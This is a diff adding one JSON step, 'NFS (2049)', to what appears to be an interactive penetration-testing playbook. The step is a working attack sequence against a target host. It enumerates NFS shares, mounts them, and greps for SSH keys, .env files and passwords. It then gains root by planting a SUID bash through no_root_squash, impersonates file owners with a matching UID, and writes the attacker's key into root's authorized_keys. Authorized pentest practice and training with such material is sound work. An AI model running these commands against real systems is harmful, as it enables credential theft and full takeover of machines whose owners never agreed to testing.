@@ -1,0 +1,26 @@
+{
+  "id": "nfs_enum",
+  "phase": "RECON",
+  "title": "NFS (2049)",
+  "body": "NFS shares expose the filesystem. no_root_squash = instant root. Mount the share, check UIDs, look for SSH keys and credentials.",
+  "cmd": "nmap -p 2049,111 --script nfs-ls,nfs-showmount,nfs-statfs $ip\nshowmount -e $ip\nrpcinfo -p $ip | grep nfs\n\n# Mount the share\nmkdir /mnt/nfs\nmount -t nfs $ip:/share /mnt/nfs -o nolock\nls -la /mnt/nfs\n\n# Find interesting files\nfind /mnt/nfs -name \"*.key\" -o -name \"*.pem\" -o -name \"id_rsa\" 2>/dev/null\nfind /mnt/nfs -name \"*password*\" -o -name \".env\" 2>/dev/null\ngrep -r \"password\\|secret\\|key\" /mnt/nfs 2>/dev/null\n\n# Check file ownership UIDs\nls -lan /mnt/nfs   # numeric UIDs — match them locally\n\n# no_root_squash exploit — run as root on Kali\ncp /bin/bash /mnt/nfs/rootbash\nchmod +s /mnt/nfs/rootbash\n# On target: /path/to/rootbash -p\n\n# UID manipulation — match file owner\nuseradd -u 1000 fakeuser && su fakeuser\n\n# Write SSH key if home dir is exported\nmkdir -p /mnt/nfs/root/.ssh\ncp ~/.ssh/id_rsa.pub /mnt/nfs/root/.ssh/authorized_keys\nchmod 600 /mnt/nfs/root/.ssh/authorized_keys\nssh root@$ip",
+  "warn": "Always check if no_root_squash is set — showmount output shows (everyone) vs (ro,root_squash).",
+  "choices": [
+    {
+      "label": "no_root_squash — SUID bash = root",
+      "next": "got_root_linux"
+    },
+    {
+      "label": "Wrote SSH key — shell as root",
+      "next": "got_root_linux"
+    },
+    {
+      "label": "Found credentials in share",
+      "next": "creds_found"
+    },
+    {
+      "label": "Found SSH key",
+      "next": "ssh_key"
+    }
+  ]
+}
